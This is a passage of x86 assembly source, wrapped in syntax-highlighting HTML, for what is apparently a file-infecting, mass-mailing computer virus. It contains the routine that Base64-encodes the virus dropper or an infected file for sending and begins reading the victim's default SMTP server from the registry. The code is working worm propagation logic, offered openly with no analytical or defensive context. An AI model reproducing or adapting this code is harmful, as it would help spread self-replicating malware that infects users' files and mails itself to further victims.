</span><span class="sc5">CreateVirusBase64Image</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Infection_Success</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">   </span><span class="sc1">;if we didnt success to infect file</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">SendDropper</span><span class="sc0">             </span><span class="sc1">;or the running file is not infected</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">get_len</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CpyPath</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_len</span><span class="sc0">
</span><span class="sc5">CpyPath</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wvltg_exe_path</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;we simple send the virus dropper</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_____1</span><span class="sc0">
</span><span class="sc5">SendDropper</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wvltg_exe_path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Base64CreationErr</span><span class="sc0">
</span><span class="sc5">_____1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;open it:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wvltg_exe_path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Base64CreationErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;get file size:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseFileErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virusfilesize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">    </span><span class="sc1">;allocate more memory than needed,just for safty</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GPTR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;allocate memory</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseFileErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">base64outputmem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;map file into the memory</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">B64FreeMemErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">B64CloseMapErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusinmem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">base64outputmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virusfilesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Base64</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sizeofbase64out</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusinmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">B64CloseMapErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">B64FreeMemErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">base64outputmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CloseFileErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvirusfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Base64CreationErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">wvltg_exe_path</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">hvirusfile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">virusfilesize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">base64outputmem</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sizeofbase64out</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hvirusmap</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hvirusinmem</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;input:</span><span class="sc0">
</span><span class="sc1">;esi - data source</span><span class="sc0">
</span><span class="sc1">;edi - where to write encoded data</span><span class="sc0">
</span><span class="sc1">;ecx - size of data to encode</span><span class="sc0">
</span><span class="sc1">;output:</span><span class="sc0">
</span><span class="sc1">;eax - size of encoded data</span><span class="sc0">
</span><span class="sc5">Base64</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">@3Bytes</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">@outbit</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">             </span><span class="sc1">;leave only 6 bits</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Base64Table</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@outbit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ExitB64</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">             </span><span class="sc1">;did we need to add new line ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DoLoop</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0a0dh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">DoLoop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@3Bytes</span><span class="sc0">
</span><span class="sc5">ExitB64</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">Base64Table</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="sc0">


</span><span class="sc5">GetSMTPServer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;get the default smtp server from the registry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">smtp_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SmtpGetErr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SizeOfAccountNum</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">accountnum</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">default_mail</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegQueryValueEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseKeyErr</span><span class="sc0">
